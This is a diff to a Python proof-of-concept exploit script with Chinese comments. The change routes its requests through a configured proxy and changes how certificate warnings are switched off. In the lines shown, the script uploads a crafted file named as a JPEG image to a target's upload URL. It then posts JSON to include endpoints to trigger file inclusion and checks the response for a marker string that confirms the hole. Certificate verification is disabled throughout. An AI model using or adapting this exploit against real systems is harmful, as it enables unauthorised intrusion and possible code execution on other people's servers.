@@ -3,13 +3,13 @@
 
 import json
 import requests
-import requests.packages.urllib3
 import re
 import io
-from Config.config_requests import ua
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -94,7 +94,7 @@ def verify_poc(target,exp=None):
         mem_string = exp_content()
         target_tmp_file = [('ATTACHMENT', ('upload_exp.jpg', mem_string.read(), 'image/jpeg'))]
     try:
-        res = requests.post(upload_url, headers=headers, files=target_tmp_file, verify=False, timeout=5)
+        res = requests.post(upload_url, headers=headers, files=target_tmp_file, verify=False, timeout=5,proxies=proxies)
     except:
         pass
     res_content = res.text
@@ -119,10 +119,10 @@ def poc(target,exp=None):
         include_data = json.dumps(include_json_data)
         include_form_data = {"json":include_data}
         # 请求poc验证
-        target_res = requests.post(include_url1, data=include_form_data, verify=False, timeout=5)
+        target_res = requests.post(include_url1, data=include_form_data, verify=False, timeout=5,proxies=proxies)
         result['vul_url'] = include_url1
         if target_res.status_code == 404:
-            target_res = requests.post(include_url2, data=include_form_data, verify=False, timeout=5)
+            target_res = requests.post(include_url2, data=include_form_data, verify=False, timeout=5,proxies=proxies)
             result['vul_url'] = include_url2
         if exp == None:
             if "this is a friendly test" in str(target_res.text):
